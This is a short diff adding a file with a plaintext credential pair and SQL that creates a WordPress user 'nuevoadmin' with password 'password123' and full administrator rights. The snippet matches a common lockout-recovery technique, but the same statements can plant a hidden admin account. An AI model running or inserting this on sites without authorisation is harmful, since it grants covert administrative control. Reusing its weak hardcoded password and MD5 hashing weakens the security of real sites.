@@ -1,0 +1,9 @@
+password123
+nuevoadmin
+
+INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name)
+VALUES ('nuevoadmin', MD5('password123'), 'nuevoadmin', 'admin@example.com', NOW(), 0, 'Nuevo Admin');
+
+INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
+VALUES ((SELECT ID FROM wp_users WHERE user_login = 'nuevoadmin'), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}'),
+       ((SELECT ID FROM wp_users WHERE user_login = 'nuevoadmin'), 'wp_user_level', '10');
